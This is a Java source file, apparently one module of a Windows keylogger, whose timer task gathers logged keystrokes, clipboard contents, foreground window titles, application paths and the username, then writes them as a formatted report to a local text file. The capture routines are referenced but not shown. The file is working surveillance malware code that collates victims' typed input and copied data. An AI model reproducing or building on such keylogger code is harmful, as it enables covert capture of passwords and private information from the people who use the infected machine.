import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.time.format.DateTimeFormatter;
import java.util.HashMap;
import java.util.Objects;
import java.util.TimerTask;

public class FileWriting extends TimerTask {
    private static int index = 0;

    static void formatting() {
        HashMap<Integer, String> map = EnumerateWindows.getHashMap();
        if (map.size() == 0) return;
        BalancedBST tree = KeyLogger.balancedBST;
        StringBuilder result = new StringBuilder();
        result.append("From UserName : ").append(System.getProperty("user.name")).append("\n");
        // append the user ip address
        // append the current zoned date time to the result
        result.append("At time : ").append(java.time.ZonedDateTime.now().format(DateTimeFormatter.ofPattern("dd/MM/yyyy hh:mm:ss a z"))).append("\n");
        result.append(print());
        result.append(String.format("%7s |      %-20s   |    %-19s   | %-32s | %-50s | %-20s |\n", "Index", "Date/Time", "    Source", "  Title/Description", "Values", "Clipboard"));
        result.append(print());
        /*
         * arr[0] = time/date
         * arr[2] = source name (e.g. "Notepad")
         * arr[1] = title value
         * */
        while (index < map.size()) {
            String[] arr = map.get(++index).split(", ");
            int treeKeyValue = tree.modifiedSearch(index);
            int hashMapKeyValue = Integer.parseInt(Objects.requireNonNull(returnKey(map, map.get(index))));
            String string = tree.search(treeKeyValue).split(",")[0];
            String truncateTitle = truncate(arr[1].split("\r")[0], 14); // reading only the first line of the title
            String[] getProgramName = arr[2].split("\\\\");
            String programName = getProgramName[getProgramName.length - 1];
            String programWidth = "23";
            if (programName.length() < 23) programWidth = "24";
            result.append(String.format("%7d | %-10s | %-" + programWidth + "s | %-32s | %-50s | %-20s |\n", index, arr[0], programName,
                    truncateTitle + "...<KeyValue=" + hashMapKeyValue + ">", truncate(string, 30) + "...<KeyValue=" + treeKeyValue + ">", truncate(arr[3], 17) + "..."));
            result.append(print());
        }
        result.append("\n************************************************************* Foreground Windows Title Descriptions && Values ********************************************************************************\n");
        index = 0;
        while (index < map.size()) {
            String temp = "\n\t<KeyValue=" + ++index + ">:";
            int treeKeyValue = tree.modifiedSearch(index);
            result.append(temp);
            String[] arr = map.get(index).split(", ");
            result.append("\n\t\tDate/Time: ").append(arr[0]);
            result.append("\n\t\tTitle: ").append(arr[1]);
            result.append("\n\t\tApplication Path: ").append(arr[2]);
            result.append("\n\t\tClipboard: ").append(arr[3]);
            result.append("\n\t\t[TreeKeyValue=").append(treeKeyValue).append("]:\n\t\t\t").append(tree.search(treeKeyValue));
            result.append(String.format("\n%-30s+--------------------------------------------------------+", ""));
        }
        result.append("\n************************************************************* End ********************************************************************************************\n");
        System.out.println(result);
        try (FileWriter fw = new FileWriter(new File(".\\src\\win.txt"), false)) {
            fw.write(result.toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static String truncate(String str, int length) {
        if (str.length() < length) return str;
        return str.substring(0, length);
    }

    static String returnKey(HashMap<Integer, String> map, String obj) {
        for (Integer list : EnumerateWindows.getHashMap().keySet()) {
            if (map.get(list).equals(obj)) {
                return list.toString();
            }
        }
        return null;
    }

    static String print() {
        return ("--------+-----------------------------+--------------------------+----------------------------------+----------------------------------------------------+----------------------+\n");
    }

    @Override
    public void run() {
        formatting();
        index = 0;
    }
}
